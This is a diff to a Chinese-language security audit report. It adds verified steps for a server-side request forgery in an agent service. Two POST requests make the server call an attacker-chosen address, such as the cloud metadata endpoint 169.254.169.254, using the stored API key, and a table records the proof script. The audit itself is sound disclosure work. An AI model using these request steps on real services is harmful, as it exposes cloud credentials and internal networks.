@@ -969,9 +969,23 @@ export function assertHttpUrl(raw: string): string {
 
 ```
 1. POST /api/agent/models { provider: 'evil', modelId: 'x', baseUrl: 'http://169.254.169.254/latest' }
-2. POST /api/agent/chat/completion { model: 'evil/x', messages: [...] }
+2. POST /api/agent/chat/completion { provider: 'evil', model: 'x', messages: [...] }
 3. 服务端带着你的 API Key 去请求那个地址，把响应（或错误）回显出来
 ```
+
+**注意第 2 步的字段**：`model` 是 modelId，不会按 `/` 拆成「渠道/模型」。写成 `model: 'evil/x'` 会被当成一个不存在的模型名，静默落回默认模型（实测报的是「deepseek / deepseek-flash 没配凭据」）。要指定渠道必须单独给 `provider`。这个细节实测踩过，写错会让人误以为 SSRF 不成立。
+
+**已在真实服务上跑通整条链**（`.scratch/header-probe/run17-ssrf.mjs`，8945 端口，本机起一个假模型端点）：
+
+```
+1. POST /api/agent/models {provider:'evil', modelId:'x', baseUrl:'http://127.0.0.1:<假端点>/v1', apiKey:'sk-evil'}
+   → 200，模型写进配置（hasKey: true）
+2. POST /api/agent/chat/completion {provider:'evil', model:'x', ...}（带 Origin: http://evil.test:9999）
+   → 502（因为假端点回的是非流式 JSON，SDK 要流式）
+3. 假端点实际收到 3 次 POST /v1/chat/completions，每次带 `Authorization: Bearer sk-evil`
+```
+
+第 3 步是重点：**请求确实打到了我们指定的地址**，而且带着我们写的 Key。502 只是「响应形状不对」，不影响「出网已发生」这个结论；重试 3 次说明它还会重复打。
 
 这能打到：云厂商元数据服务、内网管理面板、本机其它端口，也可以拿它做端口扫描（错误信息能区分连接拒绝/超时）。
 
@@ -1363,6 +1377,7 @@ POST /api/canvases/default/resources?name=big.bin
 | 简单请求（`text/plain`）可改画布 | `run10-simple.mjs` + `run11-real-simple.mjs`（真实服务） |
 | 简单请求也能改项目 / 资产 / KV | `run14-real-others.mjs`（真实服务） |
 | 上传没有大小上限（200MB 被接受） | `run16-upload-limit.mjs`（真实服务） |
+| SSRF 端到端打通（服务端带 Key 请求指定地址） | `run17-ssrf.mjs`（真实服务 + 假模型端点） |
 | 跨源 `PUT /api/canvases/:id` 能整张覆盖 | `run12-real-put.mjs`（真实服务） |
 | `/mcp` 跨源可调、简单请求打不进 | `run15-mcp.mjs`（真实服务） |
 | 公网页面打 127.0.0.1 未被 PNA 拦 | `run13-b-rebase.mjs` |
